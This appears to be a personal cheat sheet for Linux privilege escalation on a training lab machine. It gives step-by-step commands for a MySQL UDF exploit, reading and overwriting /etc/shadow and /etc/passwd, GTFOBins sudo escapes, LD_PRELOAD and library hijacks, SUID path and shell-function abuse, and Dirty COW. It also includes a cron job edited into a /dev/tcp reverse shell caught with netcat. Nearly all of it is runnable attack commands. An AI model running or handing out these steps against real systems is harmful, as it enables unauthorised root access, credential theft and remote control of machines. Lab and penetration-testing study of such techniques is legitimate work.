

# 💻 <span style="color:#1E90FF">**SQL Exploit**</span>


###  **Change into the MySQL Directory:**

```bash
cd /home/user/tools/mysql-udf
```

---

###  **Compile the `raptor_udf2.c` Exploit Code:**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

---

###  **Connect to the MySQL Service as the Root User (No Password):**

```bash
mysql -u root
```

---

###  **Create a User Defined Function (UDF) "do_system" Using the Compiled Exploit:**

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

---

###  **Copy `/bin/bash` to `/tmp/rootbash` and Set the SUID Permission:**

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

###  **Exit from the MySQL Shell:**

```bash
exit
```

---

###  **Run `/tmp/rootbash` with Root Privileges:**

```bash
/tmp/rootbash -p
```

---

###  **Clean Up and Exit from Root:**

```bash
rm /tmp/rootbash
exit
```



# 🛡️ <span style="color:#32CD32">**Weak File Permissions (Readable shadow file)**</span>


## **Check the Permissions of the `shadow` File**

```bash
ls -l /etc/shadow
```

---

## **Show the Hash of the Root Password**

```bash
cat /etc/shadow
```

---

## **Crack the Hash with John the Ripper (Dictionary Attack)**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## **Privilege Escalation**

```bash
sudo su
```



# 🔓 **Weak File Permissions (Writable Shadow File) Exploit**



##   **Check the Permissions of the Shadow File**

Ensure the shadow file is writable:

```bash
ls -l /etc/shadow
```

---

##   **Generate a New Password Hash**

To create a password hash with your chosen password, use the following command:

```bash
mkpasswd -m (hashing algorithm) newpass
```

For example, to use **SHA-512**, the command would be:

```bash
mkpasswd -m sha-512 newpass
```

---

##  **Edit the Shadow File and Replace the Root Password Hash**

1. Open the **shadow** file with elevated privileges using a text editor like `nano` or `vi`:

```bash
nano /etc/shadow
```

2. Find the **root** entry in the shadow file.  
3. Replace the old hash with your newly generated password hash.

---

##   **Gain Root Privileges**

After replacing the password hash, escalate your privileges with:

```bash
sudo su
```

# 🌐 Weak File Permissions (Writable passwd File)



## **Check the Permissions of the `/etc/passwd` File**

First, verify that the `/etc/passwd` file is world-writable:

```bash
ls -l /etc/passwd
```

Look for a **w** in the third section of the file permissions (e.g., `-rw-rw-rw-`).

---

## **Generate a New Password Hash**

Generate a new password hash for a password of your choice using the **openssl** command:

```bash
openssl passwd newpasswordhere
```

This will output a hashed password that you can use in the next step.

---

## **Edit the `/etc/passwd` File**

Open the `/etc/passwd` file using a text editor like `nano`:

```bash
nano /etc/passwd
```

---

## **Replace or Add a Password Hash for Root**

- **Replace the Root User's Password Hash**:  
  Find the **root** user's row (the first row in the file) and replace the **x** between the first and second colon (`:`) with the newly generated password hash.

  **Before:**

  ```
  root:x:0:0:root:/root:/bin/bash
  ```

  **After:**

  ```
  root:$6$abcde$hashgoeshere:0:0:root:/root:/bin/bash
  ```

---

## **Switch to the Root**

 use the new password to switch to the root user:

```bash
su root
```


# 🔍 <span style="color:#1E90FF">**Exploiting Programs from `sudo -l` using GTFOBins**</span>



### <span style="color:#FF6347">**Step 1: Run `sudo -l` to List Allowed Commands**</span>

Open your terminal and run the following command to list the allowed `sudo` commands for your user:

```bash
sudo -l
```

This command displays all programs you are allowed to run with `sudo`. Example output:

```bash
User user may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL) NOPASSWD: /bin/bash
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/find
```

---

###  <span style="color:#32CD32">**Step 2: Identify Exploitable Programs on GTFOBins**</span>

Head over to [GTFOBins](https://gtfobins.github.io/) and search for each program that appeared in your `sudo -l` output. This website lists binaries that can be exploited to escalate privileges.

**Search for each program** listed in your `sudo -l` output such as `nmap`, `bash`, `vim`, etc., on GTFOBins.

---

### ️ <span style="color:#FFD700">**Step 3: Follow GTFOBins Instructions**</span>

For every exploitable program you find on GTFOBins, follow the instructions provided on the website to perform privilege escalation.

---

### **Examples of Exploitable Programs**:

---

####  <span style="color:#FF6347">**1. `nmap` Exploit:**</span>

If `nmap` is listed in `sudo -l`:

1. Visit the [nmap page on GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).
2. Follow these Sudo instructions:
   ```bash
   sudo nmap --interactive
   ```
3. Once inside the interactive prompt, type:
   ```bash
   !sh
   ```
   This will spawn a **root shell**.

---

####  <span style="color:#32CD32">**2. `bash` Exploit:**</span>

If `bash` is listed in `sudo -l`, follow these steps:

1. Visit the [bash page on GTFOBins](https://gtfobins.github.io/gtfobins/bash/).
2. Run the command:
   ```bash
   sudo bash
   ```
   This will directly give you a **root shell**.

---

####  <span style="color:#FFD700">**3. `vim` Exploit:**</span>

If `vim` appears in your `sudo -l` output, follow these steps:

1. Visit the [vim page on GTFOBins](https://gtfobins.github.io/gtfobins/vim/).
2. Use the following command:
   ```bash
   sudo vim -c ':!sh'
   ```
   This will drop you into a **root shell** within the `vim` editor.

---

####  <span style="color:#1E90FF">**4. `find` Exploit:**</span>

If `find` is listed:

1. Visit the [find page on GTFOBins](https://gtfobins.github.io/gtfobins/find/).
2. Run the following:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
   This will spawn a **root shell** using the `find` command.

---

###  <span style="color:#FF4500">**Step 4: Verify Your Privilege Escalation**</span>

After executing the GTFOBins instructions, verify that you’ve escalated privileges successfully by running:

```bash
whoami
```

If the output is `root`, you’ve **successfully gained root access**!

---

###  <span style="color:#FF6347">**Step 5: Repeat for Each Program**</span>

Search each program listed by `sudo -l` on GTFOBins and follow the steps provided to see if you can exploit them for privilege escalation.

By following this process, you can methodically **exploit allowed binaries** and **gain root access** on your system!


# ⚙️ **LD_PRELOAD Exploit**



##  <span style="color:#1E90FF">**Step 1: List the Programs Allowed by `sudo -l`**</span>

First, identify which programs you are allowed to run with `sudo` by executing:

```bash
sudo -l
```

This will give you a list of programs that can be run without a password. 

---

## ️ <span style="color:#32CD32">**Step 2: Create a Shared Object from `/home/user/tools/sudo/preload.c`**</span>

Next, compile the malicious shared object using the provided code (`preload.c`). Run this command:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

This will create the `preload.so` file in the `/tmp` directory, ready to be loaded into a privileged process.

---

##  <span style="color:#FFD700">**Step 3: Run a Program with `LD_PRELOAD` to Exploit**</span>

Now, execute one of the programs from the `sudo -l` list while setting the `LD_PRELOAD` environment variable to your malicious shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

Replace `program-name-here` with the actual program name from your `sudo -l` output. This should allow you to escalate privileges and gain control over the target process.



# 🧩 **LD_LIBRARY Exploit**




##  **Run `ldd` to See Apache2 Shared Libraries**

To check which shared libraries are used by Apache2, run the following command:

```bash
ldd /usr/sbin/apache2
```

This will list all the shared libraries that Apache2 relies on, including the paths to those libraries.

---

## ️ **Create a Malicious Shared Object (libcrypt.so.1)**

From the libraries listed, let's create a malicious shared object with the same name as `libcrypt.so.1` using the provided exploit code `library_path.c`. 

To compile the malicious shared object, run:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

This command compiles the code and outputs a shared object called `libcrypt.so.1` into the `/tmp` directory.

---

##  **Run Apache2 with the `LD_LIBRARY_PATH` Exploit**

Now, execute Apache2 using `sudo` while specifying the `LD_LIBRARY_PATH` environment variable to point to the directory where your malicious shared object (`/tmp`) is stored:

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

By doing this, Apache2 will load your malicious shared object instead of the legitimate one, potentially allowing you to exploit the system.

# 📄 cron jobs-file permission

##  **Step 1: View the Contents of the System-Wide Crontab**

Check the system-wide crontab to identify scheduled tasks:

```bash
cat /etc/crontab
```

This command displays the system's cron jobs, which can help you find automated tasks that may run `overwrite.sh`.

---

##  **Step 2: Locate the Full Path of the `overwrite.sh` File**

To find the exact location of `overwrite.sh`, use:

```bash
locate overwrite.sh
```

This command will return the full path of the file so you can modify it.

---

## **Step 3: Edit the `overwrite.sh` File to Include a Reverse Shell**

Edit the file to insert the following reverse shell code:

```bash
#!/bin/bash
bash -i >& /dev/tcp/your-ip/listen-port 0>&1
```

Replace `your-ip` with your attacker's IP address and `listen-port` with the port you're listening on (e.g., `4444`).

---

## **Step 4: Set Up a Netcat Listener in Another Shell Tab**

In a new terminal tab, set up a listener with Netcat to catch the reverse shell:

```bash
nc -nvlp 4444
```

This will open port `4444` and wait for incoming connections from the reverse shell.

---

Once the cron job runs the `overwrite.sh` script, it should execute the reverse shell, connecting back to your Netcat listener.

# 🧑‍💻 SUID Known Exploits


### 1. **Find SUID and SGID Files**

Run the following command to find files with SUID/SGID bits set:

```bash
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

---

### 2. **Analyze the Found Files**

Check if the found SUID/SGID files are essential or pose a risk:

- **Common safe files**: `/bin/passwd`, `/usr/bin/sudo`, `/bin/su`.
- **Investigate**: Custom, old, or rarely used binaries.

---

### 3. **Check Vulnerabilities**

Use these tools to search for exploits related to each SUID/SGID file:

- **[Exploit-DB](https://www.exploit-db.com/)**: Search for the binary name.
- **[GTFOBins](https://gtfobins.github.io/)**: Search for the binary to see known exploitation techniques.

  # 🗂️ SUID Shared object injection

### 1. **Execute the SUID Program**

Run the vulnerable **SUID** program to observe its current behavior:

```bash
/usr/local/bin/suid-so
```

You will see that it displays a progress bar before exiting.

---

### 2. **Use `strace` to Identify Missing Shared Objects**

Run `strace` to inspect the system calls made by the program, specifically looking for missing files like shared objects:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

You’ll notice it tries to load a shared object from your home directory:  
`/home/user/.config/libcalc.so`, but this file does not exist.

---

### 3. **Create the Required Directory**

Since the program expects the `.so` file in a non-existent directory, create the directory:

```bash
mkdir /home/user/.config
```

---

### 4. **Compile the Shared Object**

There is an example shared object code available at `/home/user/tools/suid/libcalc.c` that spawns a Bash shell. Compile it into the required shared object:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

---

### 5. **Execute the Vulnerable Program**

Now, run the vulnerable **SUID** program again:

```bash
/usr/local/bin/suid-so
```

This time, instead of the progress bar, you will gain a **root shell**.


# 📜 SUID Environment Variables

### 1. **Execute the SUID Program**

Run the vulnerable **SUID** program to see what it does:

```bash
/usr/local/bin/suid-env
```

You'll notice it tries to start the **apache2** web server.

---

### 2. **Use `strings` to Inspect the Binary**

Run the `strings` command on the executable to view readable text within the binary:

```bash
strings /usr/local/bin/suid-env
```

In the output, you'll see a line like this:

```bash
service apache2 start
```

This indicates that the program tries to call the `service` command, but it does not use the full path (`/usr/sbin/service`).

---

### 3. **Compile a Malicious `service` Program**

To exploit the missing absolute path, compile a malicious `service` program that spawns a **Bash shell**. The source code is located at `/home/user/tools/suid/service.c`. Compile it into an executable called `service`:

```bash
gcc -o service /home/user/tools/suid/service.c
```

---

### 4. **Modify the `PATH` Environment Variable**

Prepend the current directory (`.`) to the `PATH` environment variable so that your malicious `service` executable is executed instead of the legitimate one:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

---

### 5. **Gain Root Shell**

After running the command, the **SUID** program will execute your custom `service` binary, and you'll gain a **root shell**.

# 🛠️ SUID Abusing shell features (1)

### 1. **Verify the Use of Absolute Path**

Use `strings` to check the content of the `/usr/local/bin/suid-env2` binary and confirm that it uses the absolute path for the `service` command:

```bash
strings /usr/local/bin/suid-env2
```

You should see that it calls `/usr/sbin/service` to start the **apache2** web server.

---

### 2. **Check Bash Version**

Ensure the installed version of Bash on your system is **less than 4.2-048**. This vulnerability exists in older Bash versions, where shell functions can override executables:

```bash
/bin/bash --version
```

If the version is below **4.2-048**, you can proceed with the exploit.

---

### 3. **Create a Malicious Bash Function**

Create a Bash function named `/usr/sbin/service` that spawns a privileged **Bash shell** (`-p` to preserve permissions). Export this function so that the **SUID** program uses it instead of the real `/usr/sbin/service`:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

---

### 4. **Run the Vulnerable Program**

Now, execute the `/usr/local/bin/suid-env2` program:

```bash
/usr/local/bin/suid-env2
```

---

### 5. **Gain Root Shell**

Instead of starting the actual **apache2** web server, your exported Bash function will be executed, giving you a **root shell**.


# 📝️ SUID Abusing shell features (2)



### 1. **Enable Bash Debugging and Set `PS4` for Exploitation**

You can take advantage of Bash’s debugging mode by setting the `PS4` environment variable to execute a command. In this case, it will copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit on it to give root privileges. Use the following command:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

- `env -i`: Clears the environment variables.
- `SHELLOPTS=xtrace`: Enables Bash tracing, printing each command before execution.
- `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'`: This sets the command to be executed when a line is traced.
- `/usr/local/bin/suid-env2`: The vulnerable SUID executable.

This command creates a SUID copy of `/bin/bash` named `rootbash` in the `/tmp` directory.

---

### 2. **Run the Exploit**

After running the above command, the `/tmp/rootbash` executable will be created with SUID privileges.

---

### 3. **Gain Root Shell**

Now, execute the **SUID** `rootbash` with the `-p` option to preserve elevated privileges and gain a root shell:

```bash
/tmp/rootbash -p
```


**Note:** This method **does not work** on Bash versions **4.4 and above** due to changes in how `PS4` is handled in newer versions of Bash.

# ⚠️ Kernal Exploits

### 1. **Run the Linux Exploit Suggester**

Use the **Linux Exploit Suggester 2** tool to identify potential kernel exploits, including **Dirty COW**:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

Check the output to confirm if **Dirty COW** is listed as a possible exploit for the kernel.

---

### 2. **Compile the Dirty COW Exploit Code**

The exploit code for **Dirty COW** is located at `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. Compile the code using **gcc**:

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

- `-pthread`: This flag enables multi-threading, which is required for the exploit.

---

### 3. **Run the Dirty COW Exploit**

Execute the compiled **Dirty COW** exploit. This exploit will replace the **SUID** file `/usr/bin/passwd` with a modified version that spawns a root shell. A backup of the original `/usr/bin/passwd` is saved to `/tmp/bak`.

```bash
./c0w
```

Note: The exploit may take a few minutes to complete.

---

### 4. **Gain Root Access**

Once the exploit has completed, execute the modified **passwd** command to gain a root shell:

```bash
/usr/bin/passwd
```

